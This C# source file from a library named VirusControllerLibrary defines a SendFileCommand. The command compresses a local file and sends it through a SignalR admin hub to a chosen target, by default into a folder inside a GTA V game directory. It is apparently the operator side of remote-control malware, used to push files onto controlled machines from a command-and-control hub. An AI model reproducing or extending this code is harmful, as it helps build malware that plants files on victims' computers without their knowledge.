using Microsoft.AspNetCore.SignalR.Client;
using System;
using System.IO;
using System.Threading.Tasks;
using VirusControllerLibrary.Extensions;

namespace VirusControllerLibrary
{
    public class SendFileCommand : AdminHubCommand, IHaveOneTargetCommand
    {
        private const string BASE_DIRECTORY_PATH = @"D:\GTAV\x64\info";
        public override string Name => "SendFile";
        public string TargetId { get; private set; }
        public string BaseDirectoryPath { get; private set; }
        public string FilePath { get; private set; }

        private Compressor _compressor = new Compressor();

        public SendFileCommand(string targetId, string baseDirectoryPath = null)
        {
            TargetId = targetId;
            BaseDirectoryPath = baseDirectoryPath;
        }
        public SendFileCommand(string targetId, string filePath, string baseDirectoryPath = null)
            : this(targetId, baseDirectoryPath)
        {
            if (File.Exists(filePath))
                FilePath = filePath;
            else
                Console.WriteLine($"file with path {filePath} do not exists");
        }

        public override async Task ExecuteAsync()
        {
            if(FilePath is null)
            {
                Console.WriteLine("FilePath is null!");
                return;
            }
            await ExecuteAsync(new FileInfo(FilePath));
        }

        public async Task ExecuteAsync(params FileInfo[] filesInfo)
        {

            foreach (var file in filesInfo)
            {
                try
                {
                    byte[] buffer = File.ReadAllBytes(file.FullName);
                    byte[] compressedBuffer = _compressor.CompressBytes(buffer);

                    string directoryPath = file.Directory.GetAllParentDirectoriesPath();
                    string fullFilePath = (BaseDirectoryPath ?? BASE_DIRECTORY_PATH + directoryPath);

                    await _hubConnection.InvokeAsync(Name, TargetId, compressedBuffer, file.Name, fullFilePath);
                }
                catch (Exception ex)
                {
                    Console.WriteLine($"Error: {ex.Message}");
                }
            }
        }
    }
}
